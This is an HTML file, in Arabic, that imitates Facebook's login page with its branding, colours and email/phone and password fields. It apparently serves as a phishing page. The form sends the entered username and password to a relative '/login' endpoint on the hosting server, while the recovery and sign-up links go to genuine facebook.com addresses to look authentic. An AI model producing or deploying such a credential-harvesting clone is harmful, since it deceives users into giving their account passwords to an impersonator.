<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f0f2f5; /* Subtle, light background */
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 420px; /* Slightly wider for better appearance */
            padding: 40px;
            background-color: #ffffff;
            border-radius: 16px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            min-height: 550px; /* Sufficient height for design balance */
            position: relative;
            overflow: hidden;
            background: linear-gradient(180deg, #ffffff 0%, #f5f6f7 100%);
        }
        .logo {
            font-size: 42px; /* Prominent logo size */
            color: #1877f2;
            font-weight: 700;
            margin-bottom: 30px;
            letter-spacing: -0.5px;
        }
        input {
            width: calc(100% - 22px);
            padding: 16px;
            margin-bottom: 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 8px rgba(24, 119, 242, 0.3);
            outline: none;
        }
        button {
            width: calc(100% - 22px);
            padding: 16px;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s, transform 0.3s, box-shadow 0.3s;
            font-weight: 600;
        }
        .login-button {
            background-color: #1877f2;
            margin-top: 10px;
        }
        .login-button:hover {
            background-color: #165eab;
            transform: scale(1.05);
            box-shadow: 0 6px 12px rgba(24, 119, 242, 0.3);
        }
        .create-account-button {
            background-color: #42b72a;
            margin-top: 12px;
        }
        .create-account-button:hover {
            background-color: #36a420;
            transform: scale(1.05);
            box-shadow: 0 6px 12px rgba(66, 183, 42, 0.3);
        }
        .footer {
            margin-top: 30px;
            font-size: 16px;
            color: #65676b;
            line-height: 1.6;
            text-align: center;
        }
        .footer a {
            color: #1877f2;
            text-decoration: none;
            display: inline-block;
            margin: 5px 0;
            font-weight: 500;
            transition: color 0.3s, text-decoration 0.3s;
        }
        .footer a:hover {
            text-decoration: underline;
            color: #165eab;
        }
        .footer .line-green {
            border-top: 1px solid #ddd;
            margin: 20px 0;
            height: 1px;
            background: #ddd;
        }

        /* Responsive styles for mobile devices */
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                max-width: 100%;
                box-shadow: 0 4px 8px rgba(0,0,0,0.15);
                min-height: 600px;
            }
            .logo {
                font-size: 36px;
                margin-bottom: 20px;
            }
            input {
                padding: 14px;
                font-size: 16px;
            }
            button {
                padding: 14px;
                font-size: 16px;
            }
            .footer .line-green {
                margin: 10px 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit" class="login-button">تسجيل الدخول</button>
        </form>
        <div class="footer">
            <a class="forgot-password" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">نسيت كلمة المرور؟</a>
            <div class="line-green"></div>
            <button class="create-account-button" onclick="window.location.href='https://www.facebook.com/r.php'">إنشاء حساب جديد</button>
        </div>
    </div>
</body>
</html>
